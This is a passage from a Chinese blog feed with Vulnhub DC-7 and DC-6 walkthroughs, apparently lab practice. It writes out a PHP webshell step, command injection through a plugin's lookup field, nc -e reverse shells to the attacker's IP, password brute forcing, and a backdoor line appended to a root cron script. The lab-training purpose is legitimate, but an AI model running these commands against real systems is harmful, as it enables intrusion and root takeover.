function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150256840.png" alt="image-20240107150256840"></p><p>我们切换到backups文件夹当中，有两个加密的文件。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150415171.png" alt="image-20240107150415171"></p><p>我们查看mbox文件，发现里面有一个定时任务 用root 运行&#x2F;opt&#x2F;scripts&#x2F;backups.sh。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150655527.png" alt="image-20240107150655527"></p><p>查看下权限什么的，发现www-data拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。</p><p>但是如果我们获得了www-data的shell 那就可以写点东西进去，然后依靠计划任务，用root去运行，那么我们可以获得了root权限的shell了。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150910815.png" alt="image-20240107150910815"></p><p>我们查看backups.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150838393.png" alt="image-20240107150838393"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107151025382.png" alt="image-20240107151025382"></p><p>可以看到命令是进入 cd &#x2F;var&#x2F;www&#x2F;html&#x2F; 后执行drush。然后去百度看看 drush是干什么呢？</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107151324192.png" alt="image-20240107151324192"></p><p>这里有写一些drush基本语法。</p><p><a href="https://www.howtoing.com/a-beginner-s-guide-to-drush-the-drupal-shell">https://www.howtoing.com/a-beginner-s-guide-to-drush-the-drupal-shell</a></p><pre class="line-numbers language-none"><code class="language-none">drush user-password admin --password&#x3D;&quot;new_pass&quot; #想要更改您的密码？就这么简单。#记得执行命令前先切换到Drupal的目录下面。cd &#x2F;var&#x2F;www&#x2F;html&#x2F;#Drupal默认账户是admin，ms02423是我设置的密码drush user-password admin --password&#x3D;&quot;ms02423&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107151725547.png" alt="image-20240107151725547"></p><p>这样就修改成功了,这里ssh登录就是为了修改后台密码</p><h4 id="5-安装php模块"><a href="#5-安装php模块" class="headerlink" title="5)安装php模块"></a>5)安装php模块</h4><p>我们可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107151840914.png" alt="image-20240107151840914"></p><p>进入到后台管理页面 然后就找写webshell的地方了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107195438599.png" alt="image-20240107195438599"></p><p>发现Content里面可以编辑文章，依次点击Manage ——&gt; Content ——&gt; Add content ——&gt; Basic page功能，尝试添加php一句话，但发现Drupal 8后为了安全需要将php单独作为一个模块导入；</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107195817029.png" alt="image-20240107195817029"></p><p>发现Extend里面可以安装新模块 试试可不可以安装php。</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">php 插件下载地址https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>ftp<span class="token punctuation">.</span>drupal<span class="token punctuation">.</span>org<span class="token operator">/</span>files<span class="token operator">/</span>projects<span class="token operator">/</span>php-8<span class="token punctuation">.</span>x-1<span class="token punctuation">.</span>x-dev<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107200017291.png" alt="image-20240107200017291"></p><p>不知道为什么我的靶场php安装不成功，试了好多次都没有成功，所以后面的内容就没有办法写了</p><p>我在网上找了一篇wp，链接地址为</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>csdn<span class="token punctuation">.</span>net<span class="token operator">/</span>qq_34028816<span class="token operator">/</span>article<span class="token operator">/</span>details<span class="token operator">/</span><span class="token number">124572886</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后面的内容因为我没有环境所以直接复制粘贴(ip地址为博主的ip地址)</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215004163.png" alt="image-20240107215004163"></p><p>安装成功</p><p>点击Enable newly added modules激活模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215038470.png" alt="image-20240107215038470"></p><p>点击前面的三角将前几栏折回，找到PHP Filetr勾选</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215115327.png" alt="image-20240107215115327"></p><p>并且点击install</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215146522.png" alt="image-20240107215146522"></p><p>我们可以看到安装成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215157777.png" alt="image-20240107215157777"></p><h4 id="6-写入一句话木马"><a href="#6-写入一句话木马" class="headerlink" title="6)写入一句话木马"></a>6)写入一句话木马</h4><p>我们写入一句话木马</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215226177.png" alt="image-20240107215226177"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215433021.png" alt="image-20240107215433021"></p><p>我们连接蚁剑，可以看到连接成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215533180.png" alt="image-20240107215533180"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215558738.png" alt="image-20240107215558738"></p><h4 id="7-kali反弹shell"><a href="#7-kali反弹shell" class="headerlink" title="7)kali反弹shell"></a>7)kali反弹shell</h4><p>kali端先监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4444</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215802992.png" alt="image-20240107215802992"></p><p>蚁剑终端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/sh <span class="token number">192.168</span>.1.11 <span class="token number">4444</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215817962.png" alt="image-20240107215817962"></p><p>我们可以看到监听成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215839317.png" alt="image-20240107215839317"></p><p>打开交互模式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215917778.png" alt="image-20240107215917778"></p><h4 id="8-提权"><a href="#8-提权" class="headerlink" title="8)提权"></a>8)提权</h4><p>提权想到之前那个脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215947890.png" alt="image-20240107215947890"></p><p>有权限</p><p>kali再监听一个端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107220042141.png" alt="image-20240107220042141"></p><p>将反弹shell写入脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"nc -e /bin/bash 192.168.1.11 6666"</span> <span class="token operator">>></span> /opt/scripts/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107220124037.png" alt="image-20240107220124037"></p><p>然后再执行脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107220152769.png" alt="image-20240107220152769"></p><p>提权到root</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107220229197.png" alt="image-20240107220229197"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell </p><p>9.实现交互式shell的几种方式</p><p>10.ssh登录</p><p>11.蚁剑的使用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-6</title>
    <link href="http://ms02423.top/2024/01/06/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-6/"/>
    <id>http://ms02423.top/2024/01/06/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-6/</id>
    <published>2024-01-06T05:49:13.000Z</published>
    <updated>2024-01-07T14:09:21.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-6 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>This isn't an overly difficult challenge so should be great <span class="token keyword">for</span> beginners<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场下载地址"><a href="#2-靶场下载地址" class="headerlink" title="2.靶场下载地址"></a>2.靶场下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-6<span class="token punctuation">,</span><span class="token number">315</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h2><p>下载下来是虚拟机压缩文件，直接用Vmvare导入就行。然后调一下网络，建议调成NAT模式，桥接其实也行.</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106135646346.png" alt="image-20240106135646346"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶机真实IP"><a href="#1-寻找靶机真实IP" class="headerlink" title="(1)寻找靶机真实IP"></a>(1)寻找靶机真实IP</h3><p>使用nmap进行探活，寻找靶机ip</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">namp -sP <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106135837395.png" alt="image-20240106135837395"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140058173.png" alt="image-20240106140058173"></p><p>我们知道靶场ip地址为192.168.52.137</p><h3 id="2-探端口及服务"><a href="#2-探端口及服务" class="headerlink" title="(2)探端口及服务"></a>(2)探端口及服务</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -A -v -p- <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.137</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140416427.png" alt="image-20240106140416427"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，存在web服务，Apache httpd <span class="token number">2.4</span><span class="token number">.25</span> <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>发现开放了<span class="token number">22</span>端口，OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb9u6 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以使用masscan探活端口</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">masscan --rate<span class="token operator">=</span><span class="token number">10000</span> --ports 0-65535 <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.137</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140641551.png" alt="image-20240106140641551"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140743488.png" alt="image-20240106140743488"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140943867.png" alt="image-20240106140943867"></p><p>发现找不到，我们可以明显的看到ip变成了域名，那可以知道是由于DNS解析失败导致的，我们就需要在hosts文件中添加指向。</p><h4 id="1-windows修改hosts文件"><a href="#1-windows修改hosts文件" class="headerlink" title="1)windows修改hosts文件"></a>1)windows修改hosts文件</h4><p>打开hosts文件，hosts文件路径如下</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">C<span class="token punctuation">:</span>\WINDOWS\system32\drivers\etc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106142128890.png" alt="image-20240106142128890"></p><p>添加如下内容</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token level number">192</span><span class="token number">.168</span><span class="token number">.52</span><span class="token number">.137</span> wordy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106142311316.png" alt="image-20240106142311316"></p><h4 id="2-liunx修改hosts文件"><a href="#2-liunx修改hosts文件" class="headerlink" title="2)liunx修改hosts文件"></a>2)liunx修改hosts文件</h4><p>hosts文件路径如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Vim修改hosts文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106142555410.png" alt="image-20240106142555410"></p><h4 id="3-hosts文件修改成功"><a href="#3-hosts文件修改成功" class="headerlink" title="3)hosts文件修改成功"></a>3)hosts文件修改成功</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106144015180.png" alt="image-20240106144015180"></p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106205743696.png" alt="image-20240106205743696"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><p>使用nikto工具扫描网站结构，发现登录页面wp-login.php和一些其他的目录</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nikto -h http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.137</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106150433628.png" alt="image-20240106150433628"></p><h3 id="3-进行渗透测试"><a href="#3-进行渗透测试" class="headerlink" title="(3)进行渗透测试"></a>(3)进行渗透测试</h3><h4 id="1-访问登录页面"><a href="#1-访问登录页面" class="headerlink" title="1)访问登录页面"></a>1)访问登录页面</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106150637351.png" alt="image-20240106150637351"></p><p>但是我们不知道用户名和密码，我们可以进行爆破</p><h4 id="2-获取用户名"><a href="#2-获取用户名" class="headerlink" title="2)获取用户名"></a>2)获取用户名</h4><p>我们使用wpscan进行爆破用户名</p><p>使用wpscan工具对wordpress网站扫描获取WordPress可以登录的用户</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">wpscan --url wordy -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106151019138.png" alt="image-20240106151019138"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106151110018.png" alt="image-20240106151110018"></p><p>我们可以发现5个用户名</p><h4 id="3-制作用户字典"><a href="#3-制作用户字典" class="headerlink" title="3)制作用户字典"></a>3)制作用户字典</h4><p>题目中给出了提示，告诉了我们密码字典的生成方式</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106153118646.png" alt="image-20240106153118646"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106153234123.png" alt="image-20240106153234123"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token keyword">cd</span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlistscp rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz<span class="token punctuation">.</span>bakgunzip rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz rockyou<span class="token punctuation">.</span>txtcat <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span>rockyou<span class="token punctuation">.</span>txt | grep k01 <span class="token operator">></span> wordy-pass1<span class="token punctuation">.</span>dic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106153629093.png" alt="image-20240106153629093"></p><h4 id="4-爆破用户名和密码"><a href="#4-爆破用户名和密码" class="headerlink" title="4)爆破用户名和密码"></a>4)爆破用户名和密码</h4><p>爆破时间有点长</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106154303260.png" alt="image-20240106154303260"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106154331079.png" alt="image-20240106154331079"></p><p>用户名是mark 密码helpdesk01</p><h4 id="5-进行登录"><a href="#5-进行登录" class="headerlink" title="5)进行登录"></a>5)进行登录</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>wordy<span class="token operator">/</span>wp-login<span class="token punctuation">.</span>phpMark<span class="token operator">/</span>helpdesk01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106154541856.png" alt="image-20240106154541856"></p><h4 id="6-发现RCE漏洞"><a href="#6-发现RCE漏洞" class="headerlink" title="6)发现RCE漏洞"></a>6)发现RCE漏洞</h4><p>简单看一下页面，发现存在activity_monitor插件，存在功能 IP 转十进制和一个域名解析lookup的功能、使用nslookup命令执行的，可能存在一个RCE的漏洞。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106154836166.png" alt="image-20240106154836166"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155007452.png" alt="image-20240106155007452"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155022692.png" alt="image-20240106155022692"></p><p>发现长度限制并绕过</p><pre><code>发现在前端做了长度限制，最长长度只能输入15个字符，就是说输入114.114.114.114的话没办法加命令，这里提供两个思路，一个就是采用burp抓包修改，一个就是直接修改html我这里采用修改html的方式绕过长度限制打开开发者模式F12输入114.114.114.114，点击lookup，采用小箭头找到输入框，找到114的位置，把114.114.114.114改成114.114.114.114;whoami，然后再次点击lookup，命令执行成功，同理我们可以反弹shell</code></pre><p>我们使用看到无法输入</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155219804.png" alt="image-20240106155219804"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155451150.png" alt="image-20240106155451150"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155601516.png" alt="image-20240106155601516"></p><h3 id="4-反弹shell到kali"><a href="#4-反弹shell到kali" class="headerlink" title="(4)反弹shell到kali"></a>(4)反弹shell到kali</h3><h4 id="1-kali进行监听"><a href="#1-kali进行监听" class="headerlink" title="1)kali进行监听"></a>1)kali进行监听</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nc -lvnp <span class="token number">55555</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-靶机执行命令"><a href="#2-靶机执行命令" class="headerlink" title="2)靶机执行命令"></a>2)靶机执行命令</h4><p>把html输入内容位置改成反弹的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">114.114</span>.114.114<span class="token punctuation">;</span><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash <span class="token number">192.168</span>.52.152 <span class="token number">55555</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-监听成功"><a href="#3-监听成功" class="headerlink" title="3)监听成功"></a>3)监听成功</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106160119704.png" alt="image-20240106160119704"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106160805765.png" alt="image-20240106160805765"></p><h4 id="4-进入交互式shell"><a href="#4-进入交互式shell" class="headerlink" title="4)进入交互式shell"></a>4)进入交互式shell</h4><p>这个shell不好用，进入交互式shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106160818161.png" alt="image-20240106160818161"></p><h3 id="5-进行提权"><a href="#5-进行提权" class="headerlink" title="(5)进行提权"></a>(5)进行提权</h3><h4 id="1-尝试suid提权失败"><a href="#1-尝试suid提权失败" class="headerlink" title="1)尝试suid提权失败"></a>1)尝试suid提权失败</h4><p>查找具有suid权限的程序</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106201514030.png" alt="image-20240106201514030"></p><p>没有发现可以利用的程序，我们换一个思路</p><h4 id="2-查找可执行操作"><a href="#2-查找可执行操作" class="headerlink" title="2)查找可执行操作"></a>2)查找可执行操作</h4><p>执行sudo -l，发现需要www-data的密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202103926.png" alt="image-20240106202103926"></p><p>我们切换到home目录下，可以发现有4个用户名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202225676.png" alt="image-20240106202225676"></p><p>我们一个一个进行查看，最后进入到mark用户的家目录下，stuff文件下有一个things-to-do.txt文件，查看文件内容发现graham用户及登录密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202618991.png" alt="image-20240106202618991"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202731250.png" alt="image-20240106202731250"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106202745818.png" alt="image-20240106202745818"></p><p>可以看到有一个stuff文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106203025536.png" alt="image-20240106203025536"></p><h4 id="3-切换到graham用户"><a href="#3-切换到graham用户" class="headerlink" title="3)切换到graham用户"></a>3)切换到graham用户</h4><p>我们切换用户为graham，输入密码GSo7isUM1D4</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106203628420.png" alt="image-20240106203628420"></p><h4 id="4-发现jens目录下backups-sh文件"><a href="#4-发现jens目录下backups-sh文件" class="headerlink" title="4)发现jens目录下backups.sh文件"></a>4)发现jens目录下backups.sh文件</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>home<span class="token operator">/</span>jens<span class="token operator">/</span>backups<span class="token punctuation">.</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106203805466.png" alt="image-20240106203805466"></p><p>查看备份文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /home/jens/backrups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204017919.png" alt="image-20240106204017919"></p><p>发现里面是如下命令，是对web的文件进行打包备份</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-czf</span> backups.tar.gz /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204359682.png" alt="image-20240106204359682"></p><h4 id="5-切换到jens-用户"><a href="#5-切换到jens-用户" class="headerlink" title="5)切换到jens 用户"></a>5)切换到jens 用户</h4><p>向backups.sh文件中写入”&#x2F;bin&#x2F;bash”，并以jens用户去执行该脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204602880.png" alt="image-20240106204602880"></p><p>脚本执行成功后，切换到jens用户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204637136.png" alt="image-20240106204637136"></p><h4 id="6-发现jens可在无密码下执行nmap"><a href="#6-发现jens可在无密码下执行nmap" class="headerlink" title="6)发现jens可在无密码下执行nmap"></a>6)发现jens可在无密码下执行nmap</h4><p>再次查看jens可以执行的操作，发现jens可以在无密码情况下使用nmap命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106204808230.png" 